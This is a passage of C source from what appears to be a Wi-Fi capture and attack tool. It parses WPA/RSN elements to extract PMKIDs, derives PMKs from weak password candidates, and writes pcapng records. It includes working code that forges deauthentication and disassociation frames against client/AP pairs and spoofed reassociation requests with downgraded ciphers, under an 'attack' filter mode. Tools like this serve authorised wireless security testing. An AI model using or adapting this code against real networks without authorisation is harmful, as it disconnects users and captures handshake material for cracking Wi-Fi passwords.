			zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], essidstring, msg);
else if(ptrfscanlist->channel >= 10) snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d  %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
			toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
			zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], essidstring, msg);
else snprintf(servermsg, SERVERMSG_MAX, "%s %d/%d   %02x%02x%02x%02x%02x%02x %02x%02x%02x%02x%02x%02x %s [%s]\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel,
		toaddr[0], toaddr[1], toaddr[2], toaddr[3], toaddr[4], toaddr[5],
		zeiger->ap[0], zeiger->ap[1], zeiger->ap[2], zeiger->ap[3], zeiger->ap[4], zeiger->ap[5], essidstring, msg);
if(((statusout &STATUS_SERVER) == STATUS_SERVER) && (fd_socket_mcsrv > 0)) serversendstatus(servermsg, strlen(servermsg));
else fprintf(stdout, "%s", servermsg);
return;
}
/*===========================================================================*/
static void writegpwpl(uint8_t *mac)
{
static int c;
static int cs;
static char *gpwplptr;
static char gpwpl[NMEA_MAX];
static const char gpgga[] = "$GPGGA";
static const char gprmc[] = "$GPRMC";

if(nmealen < 30) return;
if(memcmp(&gpgga, &nmeasentence, 6) == 0) snprintf(gpwpl, NMEA_MAX-1, "$GPWPL,%.*s,%02x%02x%02x%02x%02x%02x*", 26, &nmeasentence[17], mac[0] , mac[1], mac[2], mac[3], mac[4], mac[5]);
else if(memcmp(&gprmc, &nmeasentence, 6) == 0) snprintf(gpwpl, NMEA_MAX-1, "$GPWPL,%.*s,%02x%02x%02x%02x%02x%02x*", 26, &nmeasentence[19], mac[0] , mac[1], mac[2], mac[3], mac[4], mac[5]);
else return;
gpwplptr = gpwpl+1;
c = 0;
cs = 0;
while(gpwplptr[c] != '*')
	{
	cs ^= gpwplptr[c];
	gpwplptr++;
	}
snprintf(gpwplptr +1, NMEA_MAX -44, "%02x", cs);
fprintf(fh_nmea, "%s\n", gpwpl);
return;
}
/*===========================================================================*/
static inline bool writecbnmea(int fd)
{
static int cblen;
static int written;
static custom_block_t *cbhdr;
static total_length_t *totallength;
static uint8_t cb[2048];

memset(&cb, 0, 2048);
cbhdr = (custom_block_t*)cb;
cblen = CB_SIZE;
cbhdr->block_type = CBID;
cbhdr->total_length = CB_SIZE;
memcpy(cbhdr->pen, &hcxmagic, 4);
memcpy(cbhdr->hcxm, &hcxmagic, 32);
cblen += addoption(cb +cblen, OPTIONCODE_NMEA, nmealen, nmeasentence);
cblen += addoption(cb +cblen, 0, 0, NULL);
totallength = (total_length_t*)(cb +cblen);
cblen += TOTAL_SIZE;
cbhdr->total_length = cblen;
totallength->total_length = cblen;
if(fd == fd_socket_mcsrv) serversendpcapng(cb, cblen);
else
	{
	written = write(fd, &cb, cblen);
	if(written != cblen) errorcount++;
	}
return true;
}
/*===========================================================================*/
static inline void writeepbown(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdrown = (enhanced_packet_block_t*)epbown;
epblen = EPB_SIZE;
epbhdrown->block_type = EPBID;
epbhdrown->interface_id = 0;
epbhdrown->cap_len = packetlenown;
epbhdrown->org_len = packetlenown;
epbhdrown->timestamp_high = timestamp >> 32;
epbhdrown->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdrown->cap_len %4)) %4;
epblen += packetlenown;
memset(&epbown[epblen], 0, padding);
epblen += padding;
epblen += addoption(epbown +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epbown +epblen);
epblen += TOTAL_SIZE;
epbhdrown->total_length = epblen;
totallenght->total_length = epblen;
if(fd == fd_socket_mcsrv) serversendpcapng(epbown, epblen);
else
	{
	written = write(fd, &epbown, epblen);
	if(written != epblen) errorcount++;
	}
return;
}
/*===========================================================================*/
static inline void writeepb(int fd)
{
static int epblen;
static int written;
static uint16_t padding;
static total_length_t *totallenght;

epbhdr = (enhanced_packet_block_t*)epb;
epblen = EPB_SIZE;
epbhdr->block_type = EPBID;
epbhdr->interface_id = 0;
epbhdr->cap_len = packetlen;
epbhdr->org_len = packetlen;
epbhdr->timestamp_high = timestamp >> 32;
epbhdr->timestamp_low = (uint32_t)timestamp &0xffffffff;
padding = (4 -(epbhdr->cap_len %4)) %4;
epblen += packetlen;
memset(&epb[epblen], 0, padding);
epblen += padding;
epblen += addoption(epb +epblen, SHB_EOC, 0, NULL);
totallenght = (total_length_t*)(epb +epblen);
epblen += TOTAL_SIZE;
epbhdr->total_length = epblen;
totallenght->total_length = epblen;
if(fd == fd_socket_mcsrv) serversendpcapng(epb, epblen);
else
	{
	written = write(fd, &epb, epblen);
	if(written != epblen) errorcount++;
	}
return;
}
/*===========================================================================*/
static inline void writeepbown_peap(int fd, uint8_t *innerpacket, size_t innerpacketlen)
{
eapauth_t *eapauth;
exteap_t *exteap;
eapauth = (eapauth_t*)(epbown +EPB_SIZE +HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE);
exteap = (exteap_t*)innerpacket;
eapauth->len = exteap->len;
memcpy(epbown +EPB_SIZE +HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE, innerpacket, innerpacketlen);
packetlenown = HDRRT_SIZE +MAC_SIZE_QOS +LLC_SIZE +EAPAUTH_SIZE +innerpacketlen;
timestamp++;
writeepbown(fd);
return;	
}
/*===========================================================================*/
/*===========================================================================*/
static inline bool setclientfilter(ownlist_t *zeiger)
{
static maclist_t *zeigerfilter;

if(filtermode == FM_PROTECT)
	{
	for(zeigerfilter = filterclientlist; zeigerfilter < filterclientlist +filterclientlistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->client, zeigerfilter->mac, fimacclientsize) == 0)
			{
			zeiger->status |= FILTERED;
			return true;
			}
		}
	return false;
	}
if(filtermode == FI_ATTACK)
	{
	for(zeigerfilter = filterclientlist; zeigerfilter < filterclientlist +filterclientlistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->client, zeigerfilter->mac, fimacclientsize) == 0) return false;
		}
	zeiger->status |= FILTERED;
	return true;
	}
return false;
}
/*===========================================================================*/
static inline bool setapfilter(macessidlist_t *zeiger)
{
static maclist_t *zeigerfilter;

if(filtermode == FM_PROTECT)
	{
	for(zeigerfilter = filteraplist; zeigerfilter < filteraplist +filteraplistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->ap, zeigerfilter->mac, fimacapsize) == 0)
			{
			zeiger->status |= FILTERED;
			return true;
			}
		}
	return false;
	}
if(filtermode == FI_ATTACK)
	{
	for(zeigerfilter = filteraplist; zeigerfilter < filteraplist +filteraplistentries; zeigerfilter++)
		{
		if(memcmp(zeiger->ap, zeigerfilter->mac, fimacapsize) == 0) return false;
		}
	zeiger->status |= FILTERED;
	return true;
	}
return false;
}
/*===========================================================================*/
static inline uint8_t *getpmk(uint8_t essidlen, uint8_t *essid)
{
static pmklist_t *zeiger;

for(zeiger = pmklist; zeiger < pmklist +PMKLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(zeiger->essidlen != essidlen) continue;
	if(memcmp(zeiger->essid, essid, essidlen) != 0) continue;
	zeiger->timestamp = timestamp;
	return zeiger->pmk;
	}
memset(zeiger, 0, PMKLIST_SIZE);
zeiger->timestamp = timestamp;
zeiger->essidlen = essidlen;
memcpy(zeiger->essid, essid, essidlen);
if(PKCS5_PBKDF2_HMAC_SHA1(weakcandidate, weakcandidatelen, essid, essidlen, 4096, 32, zeiger->pmk) == 0) return NULL;
qsort(pmklist, zeiger -pmklist +1, PMKLIST_SIZE, sort_pmklist_by_time);
return pmklist->pmk;
}
/*===========================================================================*/
static inline bool addownap(uint16_t status, uint8_t *ap)
{
static macessidlist_t *zeiger;

for(zeiger = aplist; zeiger < aplist +APLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) return false;
	if(memcmp(zeiger->ap, ap, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &status) >= AP_M2M3) return false;
	zeiger->status |= status;
	return true;
	}
return true;
}
/*===========================================================================*/
static inline bool addown(uint8_t status, uint8_t *client, uint8_t *ap)
{
static ownlist_t *zeiger;

for(zeiger = ownlist; zeiger < ownlist +OWNLIST_MAX; zeiger++)
	{
	if(zeiger->timestamp == 0) break;
	if(memcmp(zeiger->ap, ap, 6) != 0) continue;
	if(memcmp(zeiger->client, client, 6) != 0) continue;
	zeiger->timestamp = timestamp;
	if((zeiger->status &status) == status) return false;
	if(status == OW_M1M2ROGUE)
		{
		zeiger->owm1m2roguecount += 1;
		if(zeiger->owm1m2roguecount < owm1m2roguemax) return true;
		}
	zeiger->status |= status;
	return true;
	}
memset(zeiger, 0, OWNLIST_SIZE);
zeiger->timestamp = timestamp;
memcpy(zeiger->ap, ap, 6);
memcpy(zeiger->client, client, 6);
if(status == OW_M1M2ROGUE)
	{
	zeiger->owm1m2roguecount = 1;
	qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
	return true;
	}
zeiger->status = status;
qsort(ownlist, zeiger -ownlist +1, OWNLIST_SIZE, sort_ownlist_by_time);
return true;
}
/*===========================================================================*/
static inline void gettagwpa(int wpalen, uint8_t *ieptr, tags_t *zeiger)
{
static int c;
static wpaie_t *wpaptr;
static int wpatype;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static int csuitecount;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;
static int asuitecount;

wpaptr = (wpaie_t*)ieptr;
wpalen -= WPAIE_SIZE;
ieptr += WPAIE_SIZE;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if(wpaptr->ouitype != 1) return;
#ifndef BIG_ENDIAN_HOST
wpatype = wpaptr->type;
#else
wpatype = byte_swap_16(wpaptr->type);
#endif
if(wpatype != VT_WPA_IE) return;
zeiger->kdversion |= KV_WPAIE;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &ouimscorp, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
wpalen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
#ifndef BIG_ENDIAN_HOST
csuitecount = csuitecountptr->count;
#else
csuitecount = byte_swap_16(csuitecountptr->count);
#endif
for(c = 0; c < csuitecount; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
wpalen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
#ifndef BIG_ENDIAN_HOST
asuitecount = asuitecountptr->count;
#else
asuitecount = byte_swap_16(asuitecountptr->count);
#endif
for(c = 0; c < asuitecount; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &ouimscorp, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	wpalen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(wpalen <= 0) return;
	}
return;
}
/*===========================================================================*/
static inline void gettagvendor(int vendorlen, uint8_t *ieptr, tags_t *zeiger)
{
static wpaie_t *wpaptr;

wpaptr = (wpaie_t*)ieptr;
if(memcmp(wpaptr->oui, &ouimscorp, 3) != 0) return;
if((wpaptr->ouitype == VT_WPA_IE) && (vendorlen >= WPAIE_LEN_MIN)) gettagwpa(vendorlen, ieptr, zeiger);
return;
}
/*===========================================================================*/
static inline void gettagrsn(int rsnlen, uint8_t *ieptr, tags_t *zeiger)
{
static int c;
static rsnie_t *rsnptr;
static int rsnver;
static suite_t *gsuiteptr;
static suitecount_t *csuitecountptr;
static suite_t *csuiteptr;
static int csuitecount;
static suitecount_t *asuitecountptr;
static suite_t *asuiteptr;
static int asuitecount;
static rsnpmkidlist_t *rsnpmkidlistptr;
static int rsnpmkidcount;

rsnptr = (rsnie_t*)ieptr;
#ifndef BIG_ENDIAN_HOST
rsnver = rsnptr->version;
#else
rsnver = byte_swap_16(rsnptr->version);
#endif
if(rsnver != 1) return;
zeiger->kdversion |= KV_RSNIE;
rsnlen -= RSNIE_SIZE;
ieptr += RSNIE_SIZE;
gsuiteptr = (suite_t*)ieptr;
if(memcmp(gsuiteptr->oui, &suiteoui, 3) == 0)
	{
	if(gsuiteptr->type == CS_WEP40) zeiger->groupcipher |= TCS_WEP40;
	if(gsuiteptr->type == CS_TKIP) zeiger->groupcipher |= TCS_TKIP;
	if(gsuiteptr->type == CS_WRAP) zeiger->groupcipher |= TCS_WRAP;
	if(gsuiteptr->type == CS_CCMP) zeiger->groupcipher |= TCS_CCMP;
	if(gsuiteptr->type == CS_WEP104) zeiger->groupcipher |= TCS_WEP104;
	if(gsuiteptr->type == CS_BIP) zeiger->groupcipher |= TCS_BIP;
	if(gsuiteptr->type == CS_NOT_ALLOWED) zeiger->groupcipher |= TCS_NOT_ALLOWED;
	}
rsnlen -= SUITE_SIZE;
ieptr += SUITE_SIZE;
csuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
#ifndef BIG_ENDIAN_HOST
csuitecount = csuitecountptr->count;
#else
csuitecount = byte_swap_16(csuitecountptr->count);
#endif
for(c = 0; c < csuitecount; c++)
	{
	csuiteptr = (suite_t*)ieptr;
	if(memcmp(csuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(csuiteptr->type == CS_WEP40) zeiger->cipher |= TCS_WEP40;
		if(csuiteptr->type == CS_TKIP) zeiger->cipher |= TCS_TKIP;
		if(csuiteptr->type == CS_WRAP) zeiger->cipher |= TCS_WRAP;
		if(csuiteptr->type == CS_CCMP) zeiger->cipher |= TCS_CCMP;
		if(csuiteptr->type == CS_WEP104) zeiger->cipher |= TCS_WEP104;
		if(csuiteptr->type == CS_BIP) zeiger->cipher |= TCS_BIP;
		if(csuiteptr->type == CS_NOT_ALLOWED) zeiger->cipher |= TCS_NOT_ALLOWED;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
asuitecountptr = (suitecount_t*)ieptr;
rsnlen -= SUITECOUNT_SIZE;
ieptr += SUITECOUNT_SIZE;
#ifndef BIG_ENDIAN_HOST
asuitecount = asuitecountptr->count;
#else
asuitecount = byte_swap_16(asuitecountptr->count);
#endif
for(c = 0; c < asuitecount; c++)
	{
	asuiteptr = (suite_t*)ieptr;
	if(memcmp(asuiteptr->oui, &suiteoui, 3) == 0)
		{
		if(asuiteptr->type == AK_PMKSA) zeiger->akm |= TAK_PMKSA;
		if(asuiteptr->type == AK_PSK) zeiger->akm |= TAK_PSK;
		if(asuiteptr->type == AK_FT) zeiger->akm |= TAK_FT;
		if(asuiteptr->type == AK_FT_PSK) zeiger->akm |= TAK_FT_PSK;
		if(asuiteptr->type == AK_PMKSA256) zeiger->akm |= TAK_PMKSA256;
		if(asuiteptr->type == AK_PSKSHA256) zeiger->akm |= TAK_PSKSHA256;
		if(asuiteptr->type == AK_TDLS) zeiger->akm |= TAK_TDLS;
		if(asuiteptr->type == AK_SAE_SHA256) zeiger->akm |= TAK_SAE_SHA256;
		if(asuiteptr->type == AK_FT_SAE) zeiger->akm |= TAK_FT_SAE;
		}
	rsnlen -= SUITE_SIZE;
	ieptr += SUITE_SIZE;
	if(rsnlen <= 0) return;
	}
rsnlen -= RSNCAPABILITIES_SIZE;
ieptr += RSNCAPABILITIES_SIZE;
if(rsnlen <= 0) return;
rsnpmkidlistptr = (rsnpmkidlist_t*)ieptr;
#ifndef BIG_ENDIAN_HOST
rsnpmkidcount = rsnpmkidlistptr->count;
#else
rsnpmkidcount = byte_swap_16(rsnpmkidlistptr->count);
#endif
if(rsnpmkidcount == 0) return;
rsnlen -= RSNPMKIDLIST_SIZE;
ieptr += RSNPMKIDLIST_SIZE;
if(rsnlen < 16) return;
if(((zeiger->akm &TAK_PSK) == TAK_PSK) || ((zeiger->akm &TAK_PSKSHA256) == TAK_PSKSHA256)) memcpy(zeiger->pmkid, ieptr, 16);
return;
}
/*===========================================================================*/
static inline void gettags(int infolen, uint8_t *infoptr, tags_t *zeiger)
{
static ietag_t *tagptr;

memset(zeiger, 0, TAGS_SIZE);
while(0 < infolen)
	{
	if(infolen == 4) return;
	tagptr = (ietag_t*)infoptr;
	if(tagptr->len == 0)
		{
		infoptr += tagptr->len +IETAG_SIZE;
		infolen -= tagptr->len +IETAG_SIZE;
		continue;
		}
	if(tagptr->len > infolen) return;
	if(tagptr->id == TAG_SSID)
		{
		if((tagptr->len > 0) && (tagptr->len <= ESSID_LEN_MAX))
			{
			memcpy(zeiger->essid, &tagptr->data[0], tagptr->len);
			zeiger->essidlen = tagptr->len;
			}
		}
	else if(tagptr->id == TAG_CHAN)
		{
		if(tagptr->len == 1) zeiger->channel = tagptr->data[0];
		}
	else if(tagptr->id == TAG_RSN)
		{
		if(tagptr->len >= RSNIE_LEN_MIN) gettagrsn(tagptr->len, tagptr->data, zeiger);
		}
	else if(tagptr->id == TAG_VENDOR)
		{
		if(tagptr->len >= VENDORIE_SIZE) gettagvendor(tagptr->len, tagptr->data, zeiger);
		}
	infoptr += tagptr->len +IETAG_SIZE;
	infolen -= tagptr->len +IETAG_SIZE;
	}
return;
}
/*===========================================================================*/
static inline int gettlvoffset_value(uint8_t tag, uint8_t *tlvoctets, size_t tlvoctetslen)
{
size_t pos = 0;
while(pos < tlvoctetslen)
	{
	if(tlvoctets[pos] == tag) return pos +2;
	else pos += tlvoctets[pos +1] +2;
	}
return 0;
}
/*===========================================================================*/
static inline int bin2ieset(ietag_t *ieset[], uint8_t *tlvoctets, size_t tlvoctetslen)
{
size_t octet = 0;
size_t setcnt = 0;

if(tlvoctetslen == 0) return 0;
while(octet < tlvoctetslen -1)
	{
	ieset[setcnt] = (ietag_t*)(&tlvoctets[octet]);
	if(ieset[setcnt]->len > (tlvoctetslen -octet -2)) break;
	octet += ieset[setcnt]->len +2;
	setcnt++;
	if(setcnt == IESETLEN_MAX) break;
	}
return setcnt;
}
/*===========================================================================*/
static inline size_t merge_ieset2bin(uint8_t *destdata, size_t destdatalenmax, const uint8_t *mergedata, size_t mergedatalen, ietag_t *ieset[], size_t iesetlen)
{
size_t setcnt, pos = 0;
size_t destdatalen = 0;
bool mergedtags[IESETLEN_MAX] = { 0 };

while(pos < (mergedatalen -1))
	{
	for(setcnt = 0; setcnt < iesetlen; setcnt++)
		{
		if((ieset[setcnt]->id > 0) && (ieset[setcnt]->id == mergedata[pos]))
			{
			if(destdatalen > destdatalenmax -ieset[setcnt]->len -2) break;
			memcpy(&destdata[destdatalen], ieset[setcnt], ieset[setcnt]->len +2);
			destdatalen += ieset[setcnt]->len +2;
			mergedtags[setcnt] = true;
			break;
			}
		}
	if(setcnt == iesetlen)
		{
		if(destdatalen > destdatalenmax -mergedata[pos +1] -2) break;
		memcpy(&destdata[destdatalen], &mergedata[pos], mergedata[pos +1] +2);
		destdatalen += mergedata[pos +1] +2;
		}
	pos += mergedata[pos +1] +2;
	}
for(setcnt = 0; setcnt < iesetlen; setcnt++)
	{
	if(ieset[setcnt]->id > 0 && mergedtags[setcnt] == false)
		{
		if(destdatalen > destdatalenmax -ieset[setcnt]->len -2) break;
		memcpy(&destdata[destdatalen], ieset[setcnt], ieset[setcnt]->len +2);
		destdatalen += ieset[setcnt]->len +2;
		}
	}
return destdatalen;
}
/*===========================================================================*/
static inline void send_packet(int txsocket, int txsize, char *errormessage)
{
static int fdnum;
static fd_set txfds;
static struct timespec tsfdtx;

static char timestring[16];

tsfdtx.tv_sec = FDSECTXTIMER;
tsfdtx.tv_nsec = 0;
FD_ZERO(&txfds);
FD_SET(txsocket, &txfds);
fdnum = pselect(txsocket +1, NULL, &txfds, NULL, &tsfdtx, NULL);
if(fdnum < 0)
	{
	errorcount++;
	return;
	}
if(FD_ISSET(txsocket, &txfds))
	{
	if(txsize != write(txsocket, packetoutptr, txsize))
		{
		strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
		fprintf(stdout, "%s %d/%d socket error: %s\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, errormessage);
		errorcount++;
		return;
		}
	outgoingcount++;
	return;
	}
strftime(timestring, 16, "%H:%M:%S", localtime(&tv.tv_sec));
fprintf(stdout, "%s %d/%d driver is busy/broken: %s\n", timestring, ptrfscanlist->frequency, ptrfscanlist->channel, errormessage);
return;
}
/*===========================================================================*/
static inline void send_disassociation(uint8_t *macsta, uint8_t *macap, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DISASSOC;
memcpy(macftx->addr1, macsta, 6);
memcpy(macftx->addr2, macap, 6);
memcpy(macftx->addr3, macap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydisassociationsequence++ << 4;
if(mydisassociationsequence >= 4096) mydisassociationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +2, "failed to transmit deauthentication");
return;
}
/*===========================================================================*/
static void send_deauthentication2client(uint8_t *client, uint8_t *ap, uint8_t reason)
{
static mac_t *macftx;

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +2 +1);
memcpy(packetoutptr, &hdradiotap, HDRRT_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_DEAUTH;
memcpy(macftx->addr1, client, 6);
memcpy(macftx->addr2, ap, 6);
memcpy(macftx->addr3, ap, 6);
macftx->duration = 0x013a;
macftx->sequence = mydeauthenticationsequence++ << 4;
if(mydeauthenticationsequence >= 4096) mydeauthenticationsequence = 1;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM] = reason;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +2, "failed to transmit deauthentication");
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa1(macessidlist_t *zeiger)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa1data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* WPA information (WPA1 AES) */
0xdd, 0x16, 0x00, 0x50, 0xf2, 0x01, 0x01, 0x00,
0x00, 0x50, 0xf2, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x04, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x50, 0xf2, 0x02, /* AKM */
};
#define REASSOCIATIONREQUESTWPA1_SIZE sizeof(reassociationrequestwpa1data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA1_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
memcpy(macftx->addr1, zeiger->ap, 6);
memcpy(macftx->addr2, zeiger->client, 6);
memcpy(macftx->addr3, zeiger->ap, 6);
macftx->duration = 0x013a;
macftx->sequence = myclientsequence++ << 4;
if(myclientsequence >= 4096) myclientsequence = 1;
stacapa = (capreqsta_t *) (packetoutptr +HDRRT_SIZE +MAC_SIZE_NORM);
stacapa->capabilities = 0x0411;
stacapa->listeninterval = 3;
memcpy(stacapa->addr, zeiger->ap, 6);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +1] = zeiger->essidlen;
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +IETAG_SIZE], zeiger->essid, zeiger->essidlen);
memcpy(&packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE], &reassociationrequestwpa1data, REASSOCIATIONREQUESTWPA1_SIZE);
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x29] = CS_TKIP;
packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x2f] = CS_TKIP;
if((zeiger->akm &TAK_PSK) == TAK_PSK) packetoutptr[HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +0x35] = AK_PSK;
send_packet(fd_socket, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +zeiger->essidlen +IETAG_SIZE +REASSOCIATIONREQUESTWPA1_SIZE, "failed to transmit reassociationrequest");
return;
}
/*===========================================================================*/
static inline void send_reassociation_req_wpa2(macessidlist_t *zeiger)
{
static mac_t *macftx;
static capreqsta_t *stacapa;

static const uint8_t reassociationrequestwpa2data[] =
{
/* Tag: Supported Rates 1(B), 2(B), 5.5(B), 11(B), 6(B), 9, 12(B), 18, [Mbit/sec] */
0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x8c, 0x12, 0x98, 0x24,
/* Tag: Extended Supported Rates 24(B), 36, 48, 54, [Mbit/sec] */
0x32, 0x04, 0xb0, 0x48, 0x60, 0x6c,
/* power Capability */
0x21, 0x02, 0x04, 0x14,
/* vendor specific */
0xdd, 0x08, 0xac, 0x85, 0x3d, 0x82, 0x01, 0x00, 0x00, 0x00,
/* RSN information AES PSK (WPA2) */
0x30, 0x14, 0x01, 0x00,
0x00, 0x0f, 0xac, 0x04, /* group cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* pairwise cipher */
0x01, 0x00, /* count */
0x00, 0x0f, 0xac, 0x02, /* AKM */
0x00, 0x00,
};
#define REASSOCIATIONREQUESTWPA2_SIZE sizeof(reassociationrequestwpa2data)

packetoutptr = epbown +EPB_SIZE;
memset(packetoutptr, 0, HDRRT_SIZE +MAC_SIZE_NORM +CAPABILITIESREQSTA_SIZE +REASSOCIATIONREQUESTWPA2_SIZE +IETAG_SIZE +zeiger->essidlen);
memcpy(packetoutptr, &hdradiotap_ack, HDRRTACK_SIZE);
macftx = (mac_t*)(packetoutptr +HDRRT_SIZE);
macftx->type = IEEE80211_FTYPE_MGMT;
macftx->subtype = IEEE80211_STYPE_REASSOC_REQ;
